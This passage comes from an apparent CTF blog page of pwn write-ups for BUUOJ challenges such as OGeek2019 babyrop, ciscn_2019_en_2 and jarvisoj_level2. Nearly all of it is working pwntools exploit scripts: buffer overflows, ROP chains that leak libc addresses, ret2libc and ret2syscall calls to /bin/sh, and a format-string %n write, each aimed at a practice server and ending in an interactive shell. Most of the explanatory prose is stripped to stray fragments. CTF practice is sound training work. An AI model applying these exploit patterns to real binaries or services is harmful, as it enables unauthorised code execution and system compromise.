class=\"line\"></span><br><span class=\"line\">system_addr = libc_base + libc.dump(<span class=\"string\">\"system\"</span>)</span><br><span class=\"line\">bin_sh_addr = libc_base + libc.dump(<span class=\"string\">\"str_bin_sh\"</span>)</span><br><span class=\"line\">payload2=<span class=\"string\">b'A'</span>*<span class=\"number\">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class=\"line\">sl(payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p></p>\n<p>18ubuntusystem</p>\n<p>ret</p>\n</blockquote>\n<h2 id=\"OGeek2019-babyrop32puts\"><a href=\"#OGeek2019-babyrop32puts\" class=\"headerlink\" title=\"[OGeek2019]babyrop32puts\"></a>[OGeek2019]babyrop32puts</h2><p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class=\"line\"># -*- coding:utf-8 -*-</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context.os&#x3D;&#39;linux&#39;</span><br><span class=\"line\">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ru&#x3D;lambda x:p.recvuntil(x)</span><br><span class=\"line\">rl&#x3D;lambda :p.recvline()</span><br><span class=\"line\">sl&#x3D;lambda x:p.sendline(x)</span><br><span class=\"line\">sla&#x3D;lambda x,y:p.sendlineafter(x,y)</span><br><span class=\"line\"></span><br><span class=\"line\">#r &#x3D; remote(&quot;&quot;)</span><br><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29517)</span><br><span class=\"line\">#p &#x3D; process(&quot;.&#x2F;pwn&quot;)</span><br><span class=\"line\">elf &#x3D; ELF(&quot;.&#x2F;pwn&quot;)</span><br><span class=\"line\">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class=\"line\">payload &#x3D; b&#39;\\x00&#39;*7 + b&#39;\\xff&#39;</span><br><span class=\"line\">main &#x3D; 0x8048825</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">puts_plt &#x3D; elf.symbols[&#39;puts&#39;]</span><br><span class=\"line\">puts_got &#x3D; elf.got[&#39;puts&#39;]</span><br><span class=\"line\">payload2 &#x3D; b&#39;A&#39;*(0xe7+0x4) + p32(0x08048548) + p32(main) + p32(0x8049fd4)</span><br><span class=\"line\">sla(&quot;Correct\\n&quot;,payload2)</span><br><span class=\"line\">puts &#x3D; u32(p.recv(4))</span><br><span class=\"line\">log.info(&quot;libc base 0x%x&quot;,puts-libc.symbols[&#39;puts&#39;])</span><br><span class=\"line\">libc_base &#x3D; puts-libc.symbols[&#39;puts&#39;]</span><br><span class=\"line\">system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]</span><br><span class=\"line\">bin_sh_addr &#x3D; libc_base + next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;))</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">payload3 &#x3D; b&#39;A&#39;*(0xe7+0x4) + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)</span><br><span class=\"line\">sla(&quot;Correct\\n&quot;,payload3)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"2019--PWN5\"><a href=\"#2019--PWN5\" class=\"headerlink\" title=\"[2019 ]PWN5\"></a>[2019 ]PWN5</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class=\"line\"># -*- coding:utf-8 -*-</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context.os&#x3D;&#39;linux&#39;</span><br><span class=\"line\">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ru&#x3D;lambda x:p.recvuntil(x)</span><br><span class=\"line\">rl&#x3D;lambda :p.recvline()</span><br><span class=\"line\">sl&#x3D;lambda x:p.sendline(x)</span><br><span class=\"line\">sla&#x3D;lambda x,y:p.sendlineafter(x,y)</span><br><span class=\"line\"></span><br><span class=\"line\">#r &#x3D; remote(&quot;&quot;)</span><br><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27812)</span><br><span class=\"line\">#p &#x3D; process(&quot;.&#x2F;pwn&quot;)</span><br><span class=\"line\">elf &#x3D; ELF(&quot;.&#x2F;pwn&quot;)</span><br><span class=\"line\">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class=\"line\">payload &#x3D; p32(0x804C044) + &quot;aaaa%10$n&quot;</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">#print(p.recv())</span><br><span class=\"line\">sl(b&#39;8&#39;)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"BJDCTF-2nd-r2t3\"><a href=\"#BJDCTF-2nd-r2t3\" class=\"headerlink\" title=\"[BJDCTF 2nd]r2t3\"></a>[BJDCTF 2nd]r2t3</h2><p>\\x00</p>\n<blockquote>\n<p>unsigned __int8:</p>\n<p>eg</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;#include&lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;int main()</span><br><span class=\"line\">&gt;&#123;\t</span><br><span class=\"line\">char a &#x3D; 0x100;</span><br><span class=\"line\">printf(&quot;%d\\n&quot;,a-1);</span><br><span class=\"line\">printf(&quot;%d\\n&quot;,a);</span><br><span class=\"line\">printf(&quot;%d&quot;,a+1);</span><br><span class=\"line\">&gt;&#125;</span><br><span class=\"line\">&gt; -1 0 1</span><br></pre></td></tr></table></figure>\n<p>0</p>\n<p>char10xff-1</p>\n<p>+10x1000xff0</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class=\"line\"># -*- coding:utf-8 -*-</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context.os&#x3D;&#39;linux&#39;</span><br><span class=\"line\">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">s       &#x3D; lambda data               :p.send(str(data))</span><br><span class=\"line\">sa      &#x3D; lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      &#x3D; lambda data               :p.sendline(str(data))</span><br><span class=\"line\">sla     &#x3D; lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       &#x3D; lambda num&#x3D;4096           :p.recv(num)</span><br><span class=\"line\">ru      &#x3D; lambda delims, drop&#x3D;True  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     &#x3D; lambda                    :p.interactive()</span><br><span class=\"line\">uu32    &#x3D; lambda data               :u32(data.ljust(4,&#39;\\0&#39;))</span><br><span class=\"line\">uu64    &#x3D; lambda data               :u64(data.ljust(8,&#39;\\0&#39;))</span><br><span class=\"line\">leak    &#x3D; lambda name,addr          :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29806)</span><br><span class=\"line\">#p &#x3D; process(&quot;.&#x2F;r2t3&quot;)</span><br><span class=\"line\">elf &#x3D; ELF(&quot;.&#x2F;r2t3&quot;)</span><br><span class=\"line\">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class=\"line\">ret &#x3D; 0x080483be</span><br><span class=\"line\">main &#x3D; 0x804863b</span><br><span class=\"line\">system &#x3D; 0x804858b</span><br><span class=\"line\">payload &#x3D; b&#39;A&#39;*0x15  + p32(system)</span><br><span class=\"line\">payload &#x3D; payload.ljust(260,b&#39;A&#39;)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"get-started-3dsctf-2016\"><a href=\"#get-started-3dsctf-2016\" class=\"headerlink\" title=\"get_started_3dsctf_2016\"></a>get_started_3dsctf_2016</h2><blockquote>\n<p>,</p>\n</blockquote>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class=\"line\"># -*- coding:utf-8 -*-</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context.os&#x3D;&#39;linux&#39;</span><br><span class=\"line\">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">s       &#x3D; lambda data               :p.send(str(data))</span><br><span class=\"line\">sa      &#x3D; lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      &#x3D; lambda data               :p.sendline(str(data))</span><br><span class=\"line\">sla     &#x3D; lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       &#x3D; lambda num&#x3D;4096           :p.recv(num)</span><br><span class=\"line\">ru      &#x3D; lambda delims, drop&#x3D;True  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     &#x3D; lambda                    :p.interactive()</span><br><span class=\"line\">uu32    &#x3D; lambda data               :u32(data.ljust(4,&#39;\\0&#39;))</span><br><span class=\"line\">uu64    &#x3D; lambda data               :u64(data.ljust(8,&#39;\\0&#39;))</span><br><span class=\"line\">leak    &#x3D; lambda name,addr          :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26722)</span><br><span class=\"line\">#p &#x3D; process(&quot;.&#x2F;pwn4&quot;)</span><br><span class=\"line\">elf &#x3D; ELF(&quot;.&#x2F;pwn4&quot;)</span><br><span class=\"line\">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class=\"line\">system &#x3D; 0x80489b8</span><br><span class=\"line\">payload &#x3D; &#39;a&#39;*56</span><br><span class=\"line\">payload +&#x3D; p32(0x080489A0) + p32(0x0804E6A0)</span><br><span class=\"line\">payload +&#x3D; p32(0x308CD64F) + p32(0x195719D1)</span><br><span class=\"line\">sleep(0.1)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">print(p.recv())</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>getsexitflag</p>\n</blockquote>\n<p> ret2syscall</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.os=<span class=\"string\">'linux'</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level='debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pop_eax_ret = <span class=\"number\">0x080b91e6</span></span><br><span class=\"line\">pop_edx_ecx_ebx_ret = <span class=\"number\">0x0806fc30</span></span><br><span class=\"line\">int_0x80 = <span class=\"number\">0x0806d7e5</span></span><br><span class=\"line\">read_addr = <span class=\"number\">0x0806E140</span></span><br><span class=\"line\">gets_addr = <span class=\"number\">0x0804F630</span></span><br><span class=\"line\">pop_ebx_ret =  <span class=\"number\">0x080481ad</span>  <span class=\"comment\">#0x080481ad : pop ebx ; ret</span></span><br><span class=\"line\">main_addr = <span class=\"number\">0x08048A20</span></span><br><span class=\"line\">bss_addr = <span class=\"number\">0x080ECD70</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">26722</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./pwn4\"</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn4\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'./libc-2.23.so'</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">56</span> + p32(gets_addr) + p32(main_addr) + p32(bss_addr)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">sl(<span class=\"string\">b\"/bin/sh\"</span>)</span><br><span class=\"line\">payload2 = <span class=\"string\">b\"A\"</span>*<span class=\"number\">0x38</span> + p32(pop_eax_ret) + p32(<span class=\"number\">0xb</span>) + p32(pop_edx_ecx_ebx_ret) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0</span>)  +p32(bss_addr) + p32(int_0x80)</span><br><span class=\"line\">sl(payload2)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"ciscn-2019-en-2\"><a href=\"#ciscn-2019-en-2\" class=\"headerlink\" title=\"ciscn_2019_en_2\"></a>ciscn_2019_en_2</h2><p></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.os=<span class=\"string\">'linux'</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level='debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\">ru=<span class=\"keyword\">lambda</span> x:p.recvuntil(x)</span><br><span class=\"line\">rl=<span class=\"keyword\">lambda</span> :p.recvline()</span><br><span class=\"line\">sl=<span class=\"keyword\">lambda</span> x:p.sendline(x)</span><br><span class=\"line\">sla=<span class=\"keyword\">lambda</span> x,y:p.sendlineafter(x,y)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = remote(\"\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29937</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3\")</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./LibC\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')</span></span><br><span class=\"line\">puts_plt = elf.symbols[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">encrypt = <span class=\"number\">0x4009a0</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x400c83</span></span><br><span class=\"line\">ret = <span class=\"number\">0x4006b9</span></span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)</span><br><span class=\"line\">sla(<span class=\"string\">\"Input your choice!\\n\"</span>,<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">ru(<span class=\"string\">\"Input your Plaintext to be encrypted\\n\"</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">rl()</span><br><span class=\"line\">rl()</span><br><span class=\"line\">puts = u64(ru(<span class=\"string\">'\\n'</span>)[:<span class=\"number\">-1</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\x00'</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">\"puts\"</span>,puts)</span><br><span class=\"line\">print(libc)</span><br><span class=\"line\">libc_base = puts-libc.dump(<span class=\"string\">\"puts\"</span>)</span><br><span class=\"line\">log.info(<span class=\"string\">\"libc base 0x%x\"</span>,libc_base)</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr = libc_base + libc.dump(<span class=\"string\">\"system\"</span>)</span><br><span class=\"line\">bin_sh_addr = libc_base + libc.dump(<span class=\"string\">\"str_bin_sh\"</span>)</span><br><span class=\"line\">payload2=<span class=\"string\">b'A'</span>*<span class=\"number\">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class=\"line\">sl(payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"ciscn-2019-n-8\"><a href=\"#ciscn-2019-n-8\" class=\"headerlink\" title=\"ciscn_2019_n_8\"></a>ciscn_2019_n_8</h2><p>var[13] = \\x11</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class=\"line\"># -*- coding:utf-8 -*-</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context.os&#x3D;&#39;linux&#39;</span><br><span class=\"line\">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">s       &#x3D; lambda data               :p.send(str(data))</span><br><span class=\"line\">sa      &#x3D; lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      &#x3D; lambda data               :p.sendline(str(data))</span><br><span class=\"line\">sla     &#x3D; lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       &#x3D; lambda num&#x3D;4096           :p.recv(num)</span><br><span class=\"line\">ru      &#x3D; lambda delims, drop&#x3D;True  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     &#x3D; lambda                    :p.interactive()</span><br><span class=\"line\">uu32    &#x3D; lambda data               :u32(data.ljust(4,&#39;\\0&#39;))</span><br><span class=\"line\">uu64    &#x3D; lambda data               :u64(data.ljust(8,&#39;\\0&#39;))</span><br><span class=\"line\">leak    &#x3D; lambda name,addr          :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26219)</span><br><span class=\"line\">payload &#x3D; b&#39;A&#39;*(0x04*13) + p64(17)</span><br><span class=\"line\">print(payload)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"jarvisoj-level2\"><a href=\"#jarvisoj-level2\" class=\"headerlink\" title=\"jarvisoj_level2\"></a>jarvisoj_level2</h2><p>sysytem/bin/sh</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29272)</span><br><span class=\"line\">bin_sh &#x3D; 0x0804A024</span><br><span class=\"line\">elf &#x3D; ELF(&quot;.&#x2F;level2&quot;)</span><br><span class=\"line\">sys &#x3D; elf.plt[&quot;system&quot;]</span><br><span class=\"line\">payload &#x3D; b&#39;A&#39;*(0x88+0x4) + p32(sys) + p32(0) + p32(bin_sh)</span><br><span class=\"line\">print(payload)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"not-the-same-3dsctf-201632write\"><a href=\"#not-the-same-3dsctf-201632write\" class=\"headerlink\" title=\"not_the_same_3dsctf_201632write\"></a>not_the_same_3dsctf_201632write</h2><p>bssflagwrite</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29106)</span><br><span class=\"line\"></span><br><span class=\"line\">elf &#x3D; ELF(&quot;.&#x2F;pwn9&quot;)</span><br><span class=\"line\">bss&#x3D;0x080eca2d</span><br><span class=\"line\">payload&#x3D;&#39;a&#39;*(0x2d)+p32(0x80489a0)+p32(elf.sym[&#39;write&#39;])+p32(0)+p32(1)+p32(bss)+p32(45)</span><br><span class=\"line\">#print(payload)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"BJDCTF-2nd-one-gadget\"><a href=\"#BJDCTF-2nd-one-gadget\" class=\"headerlink\" title=\"[BJDCTF 2nd]one_gadget\"></a>[BJDCTF 2nd]one_gadget</h2><p></p>\n<p>one_gadget</p>\n<p>libcone_gadget</p>\n<blockquote>\n<p>libcexevce(/bin/sh)<br>: one_gadget libc-x.xx.so</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29935)</span><br><span 